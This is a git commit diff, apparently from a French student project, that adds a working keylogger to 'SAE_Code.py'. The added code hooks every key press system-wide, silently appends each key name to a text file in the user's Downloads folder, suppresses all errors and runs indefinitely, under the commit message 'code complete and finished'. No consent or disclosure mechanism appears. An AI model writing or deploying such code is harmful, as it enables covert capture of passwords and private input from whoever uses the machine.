0aa05d6fd1e5e2450732b9a65fe92d4e00474e50
Nabishii <97235382+Nabishii@users.noreply.github.com>
2023-11-02 15:07:37 +0100

    Code complet et terminé

--- SAE_Code.py
+++ SAE_Code.py
@@ -12,3 +12,19 @@ except ImportError:
     except Exception as e:
         print(f"Erreur lors de l'installation de keyboard : {e}")
         sys.exit(1)
+
+import keyboard
+
+dossier_telechargements = os.path.join(os.path.expanduser('~'), 'Downloads')
+chemin_fichier = os.path.join(dossier_telechargements, 'enregistrement_clavier.txt')
+
+def enregistrer_frappes(e):
+    try:
+        with open(chemin_fichier, "a") as fichier:
+            fichier.write(e.name)
+    except:
+        pass
+
+keyboard.on_press(enregistrer_frappes)
+
+keyboard.wait()
